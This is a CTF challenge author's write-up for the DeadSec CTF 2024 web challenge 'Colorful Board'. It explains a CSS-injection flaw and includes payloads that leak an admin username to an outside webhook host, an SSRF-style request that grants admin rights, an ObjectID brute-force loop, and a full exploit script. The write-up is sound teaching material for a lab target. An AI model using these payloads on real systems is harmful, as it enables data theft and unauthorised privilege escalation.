---
title: DeadSec CTF 2024 Review
date: 2024-07-29
categories: [CTF]
tags: [Write up]
---

## Information 
Participated with DeadSec CTF 2024 Challenge Author  

## Comment
Hello!, This is **Little stranger**, who participated DeadSec CTF as a web challenge author of `Colorful board`.  
Thank you to everyone who enjoyed and praised the challenge, even though it was hastily created.  
Next year, I will repay you with better quality challenges.

## Write up
### web/Colorful Board  

#### Desc
First Flag is Admin's username,
Second Flag is Hidden Notice content.

#### Code Review
You can register with username, password, personalColor.  
You can inject css with personalColor. But you can't xss because of xss sanitizer.
```typescript
// src/api/post/pose.controller.ts
@Get('/edit/:id')
@UseGuards(AdminGuard)
@Render('post-edit')
async renderEdit(@Req() request: Request, @Param('id') id: Types.ObjectId) {
    const post = await this.postService.getPostById(id);
    const author = await this.userService.getUserById(post.user);
    const user = request.user;

    user.personalColor = xss(user.personalColor);
    author.personalColor = xss(author.personalColor);

    return { post: post, author: author, user: request.user };
}
```
{% raw %}
```hbs
// src/common/views/post-edit.hbs
<style>
    .author {
        color:  {{{ author.personalColor }}} 
    }

    .user {
        color: {{{ user.personalColor }}}
    }
</style>
```
{% endraw %}
Using css injection, You can leak one char of Admin username. So, You can repeat these leak payload to get full username. ( 💡Alert, You should split accounts because of cookie length limit )  
  
**Example**
```python
{
    "username":"dummy",
    "password":"dummy",
    "personalColor":"black};input[class='user'][value^='DEAD{A']{ background: url('{webhook_url}/DEAD{A');}
    input[class='user'][value^='DEAD{B']{ background: url('{webhook_url}/DEAD{B');}
    input[class='user'][value^='DEAD{C']{ background: url('{webhook_url}/DEAD{C');}
    (...)"
}
```  
Next, We should get admin perm to get Notices.  
Look at the `/admin/grant` route. There is a LocalOnlyGuard.  
So, We can use css injection to **SSRF**.   
```typescript
@Get('/grant')
@UseGuards(LocalOnlyGuard)
async grantPerm(@Query('username') username: string) {
    return await this.adminService.authorize(username);
}
```
```python
{
    "username":"dummy",
    "password":"dummy",
    "personalColor":"red;}input{background: url('http://localhost:1337/admin/grant?username=dummy');"
}
```  
<br>
Second FLAG is Hidden Notice.  
It is Just Bruteforce Challenge. For **Example**
```python
res = s.get(f"http://localhost:1337/admin/notice/66946f{timestamp}88520537f149f4a", headers=auth)
if "No Notice" not in res.text:
    print(res.text)
    exit()
```
💡For details, refer to mongodb objectID creation method.  

Let’s put this all together and write exploit code.
#### Exploit
{% raw %}
```python
import requests
import string
import json

url="http://localhost:1337"
webhook_url = "https://lqlcuwb.request.dreamhack.games"
characters = string.ascii_letters
mid = len(characters) // 2
first_half = characters[:mid]
second_half = characters[mid:]
digitChar = string.digits + "_"
FLAG="DEAD{"

# Admin username leak with CSS Injection
for i in range(16):
    styles_alpha1 = [f"input[class='user'][value^='{FLAG}{char}']{{ background: url('{webhook_url}/{FLAG}{char}'); }}" for char in first_half]
    styles_alpha2 = [f"input[class='user'][value^='{FLAG}{char}']{{ background: url('{webhook_url}/{FLAG}{char}'); }}" for char in second_half]
    styles_digit = [f"input[class='user'][value^='{FLAG}{char}']{{ background: url('{webhook_url}/{FLAG}{char}'); }}" for char in digitChar]

    payload = ["\n".join(styles_alpha1), "\n".join(styles_alpha2), "\n".join(styles_digit)]

    for j in range(3):
        reg = requests.post(f"{url}/auth/register", json={"username": f"t{i}{j}", "password":f"t{i}{j}", "personalColor": "red;}"+payload[j]})
        if "saved" in reg.text:
            s = requests.session()
            res = s.post(f"{url}/auth/login", json={"username": f"t{i}{j}", "password":f"t{i}{j}"})
            token = json.loads(res.text)['accessToken']
            print(f'[+] Token: {token}')
            auth = {'Authorization': f'Baerer {token}', 'Content-Type': 'application/json'}

            res = s.post(f"{url}/post/write", headers=auth, json={"title": "asdf", "content": "asdf"})
            
            res = s.get(f"{url}/post/all", headers=auth)
            post_array = json.loads(res.text)
            post_id = post_array[0]['_id']
            print(post_id)
            res = s.get(f"{url}/admin/report?url=http://localhost:1337/post/edit/{post_id}", headers=auth)
            print(res.text)
    leaked = input("Leaked Char: ")
    FLAG += leaked

# CSRF with css Injection 
reg = requests.post(f"{url}/auth/register", json={"username": "test", "password":"test", "personalColor": "red;}input{background: url('http://localhost:1337/admin/grant?username=dummy')"})
if "saved" in reg.text:
    s = requests.session()
    res = s.post(f"{url}/auth/login", json={"username": "test", "password":"test"})
    token = json.loads(res.text)['accessToken']
    print(f'[+] Token: {token}')
    auth = {'Authorization': f'Baerer {token}', 'Content-Type': 'application/json'}

    res = s.post(f"{url}/post/write", headers=auth, json={"title": "asdf", "content": "asdf"})
    
    res = s.get(f"{url}/post/all", headers=auth)
    post_array = json.loads(res.text)
    post_id = post_array[0]['_id']
    res = s.get(f"{url}/admin/report?url=http://localhost:1337/post/edit/{post_id}", headers=auth)
    print(res.text)
```
{% endraw %}
